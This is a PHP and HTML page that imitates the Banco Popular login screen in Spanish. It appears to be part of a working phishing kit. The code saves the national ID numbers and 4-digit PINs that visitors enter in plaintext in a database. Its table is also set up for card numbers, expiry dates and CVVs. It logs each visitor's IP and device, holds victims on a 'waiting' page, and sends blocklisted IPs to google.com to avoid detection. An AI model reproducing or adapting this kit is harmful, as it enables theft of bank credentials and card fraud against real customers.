<?php
session_start();

define('DB_FILE', 'usuarios.db');

// IP real (misma lógica que el panel)
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return trim($_SERVER['HTTP_CF_CONNECTING_IP']);
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '';
}

// Detección de dispositivo por User-Agent (servidor)
function detectarDispositivo($ua) {
    $ua = strtolower(trim((string)$ua));
    if ($ua === '') return 'nd';
    if (preg_match('/ipad|tablet|playbook|silk|kindle|android(?!.*mobile)/i', $ua)) return 'tablet';
    if (preg_match('/android|iphone|ipod|mobile|windows phone|blackberry|opera mini|iemobile|webos/i', $ua)) return 'movil';
    if (preg_match('/windows nt|macintosh|mac os x|linux|x11|cros/i', $ua)) return 'pc';
    return 'nd';
}

try {
    $db = new PDO('sqlite:' . DB_FILE);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->exec("CREATE TABLE IF NOT EXISTS usuarios (
        id TEXT PRIMARY KEY,
        usuario TEXT,
        clave TEXT,
        estado TEXT,
        token TEXT,
        entidad TEXT,
        identificador TEXT,
        ip TEXT,
        fecha TEXT,
        tarjeta TEXT,
        fecha_tarjeta TEXT,
        cvv TEXT,
        ultima_actividad INTEGER
    )");

    // Añadir columnas nuevas si la tabla ya existía
    $cols = $db->query("PRAGMA table_info(usuarios)")->fetchAll(PDO::FETCH_COLUMN, 1);
    if (!in_array('dispositivo', $cols)) {
        $db->exec("ALTER TABLE usuarios ADD COLUMN dispositivo TEXT");
    }
    if (!in_array('user_agent', $cols)) {
        $db->exec("ALTER TABLE usuarios ADD COLUMN user_agent TEXT");
    }
} catch (PDOException $e) {
    die("Error al conectar con la base de datos: " . $e->getMessage());
}

// ---------- BLOQUEO DE IP DESDE EL PANEL ----------
$ipCliente = getUserIP();
$bloqueadasFile = 'ips_bloqueadas.json';
$bloqueadas = file_exists($bloqueadasFile) ? json_decode(file_get_contents($bloqueadasFile), true) : [];

if (is_array($bloqueadas) && in_array($ipCliente, array_map('trim', $bloqueadas))) {
    header("Location: https://google.com");
    exit;
}
// ------------------------------------------------

$error = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $usuario = trim($_POST["username"] ?? "");
    $clave = trim($_POST["password"] ?? "");
    $entidad = $_POST["tipo"] ?? "cc";

    if ($usuario !== "" && $clave !== "") {
        $ip = $ipCliente;
        $unaHoraAtras = date('Y-m-d H:i:s', strtotime('-1 hour'));

        $stmt = $db->prepare("SELECT COUNT(*) FROM usuarios WHERE ip = ? AND fecha > ?");
        $stmt->execute([$ip, $unaHoraAtras]);
        $intentos = $stmt->fetchColumn();

        if ($intentos >= 5) {
            $error = "Demasiados intentos desde esta IP. Intenta más tarde.";
        } else {
            $id = uniqid();
            $estado = "esperando";
            $token = "";
            $identificador = "bogota";
            $fecha = date('Y-m-d H:i:s');
            $timestamp = time();

            $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
            $dispositivo = detectarDispositivo($userAgent);

            $stmt = $db->prepare("INSERT INTO usuarios
                (id, usuario, clave, estado, token, entidad, identificador, ip, fecha, ultima_actividad, dispositivo, user_agent)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $stmt->execute([$id, $usuario, $clave, $estado, $token, $entidad, $identificador, $ip, $fecha, $timestamp, $dispositivo, $userAgent]);

            $_SESSION["user_id"] = $id;
            $_SESSION["autenticado"] = true;
            header("Location: esperando.php?id=$id");
            exit;
        }
    } else {
        $error = "Todos los campos son obligatorios.";
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Ingreso - Banco Popular</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const usuario = document.querySelector('[name="username"]');
            const password = document.querySelector('[name="password"]');
            const boton = document.querySelector('.submit-btn');

            function toggleButton() {
                if (usuario.value.trim() && password.value.trim()) {
                    boton.style.backgroundColor = '#1976d2';
                    boton.style.color = 'white';
                } else {
                    boton.style.backgroundColor = '#e0e0e0';
                    boton.style.color = '#999';
                }
            }

            usuario.addEventListener('input', toggleButton);
            password.addEventListener('input', toggleButton);
        });

        function togglePassword() {
            const input = document.querySelector('.password-input');
            input.type = input.type === 'password' ? 'text' : 'password';
        }
    </script>
</head>
<body>
    <div class="container">
        <img src="b.png" alt="Logo banco" style="width: 100%; max-width: 380px; display: block; margin: 0 auto 20px auto;">

        <div class="login-card">
            <div class="tabs">
                <button class="tab active">Clave segura</button>
                <button class="tab">Tarjeta débito</button>
            </div>

            <div class="alert-message">
                <button class="alert-close" onclick="this.parentElement.style.display='none'">&times;</button>
                Estás ingresando con tu Clave Segura. Selecciona Tarjeta Débito para cambiar el tipo de ingreso.
            </div>

            <?php if (!empty($error)): ?>
                <div class="error-messages">
                    <div class="error-message">⚠️ <?= $error ?></div>
                </div>
            <?php endif; ?>

            <form class="login-form" method="post">
                <div class="form-group">
                    <label for="username">Identificación</label>
                    <div class="input-group">
                        <select class="id-type-select" name="tipo" required>
                            <option value="cc">C.C. Cedula de ciudadania</option>
                            <option value="ce">C.E. Cedula de Extranjeria</option>
                            <option value="ti">T.I. Tarjeta de Identidad</option>
                        </select>
                        <input type="tel" class="id-number-input" name="username" placeholder="#" pattern="\d+" inputmode="numeric" required>
                    </div>
                </div>

                <div class="form-group">
                    <label for="password">Clave segura</label>
                    <div class="password-container">
                        <input type="password" class="password-input" name="password" placeholder="****" maxlength="4" pattern="\d{4}" inputmode="numeric" required>
                        <button type="button" class="toggle-password" onclick="togglePassword()">
                            <svg class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                <circle cx="12" cy="12" r="3"></circle>
                            </svg>
                        </button>
                    </div>
                </div>

                <button type="submit" class="submit-btn">Ingresar</button>
            </form>

            <div class="links">
                <a href="#" class="link">Registrarme ›</a>
                <a href="#" class="link">Olvidé mi clave ›</a>
            </div>

            <div class="recaptcha-text">
                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y <a href="#">términos del servicio</a> de Google.
            </div>
        </div>
    </div>

    <img src="h.png" alt="Imagen derecha" class="imagen-derecha">
    <script src="script.js"></script>
</body>
</html>
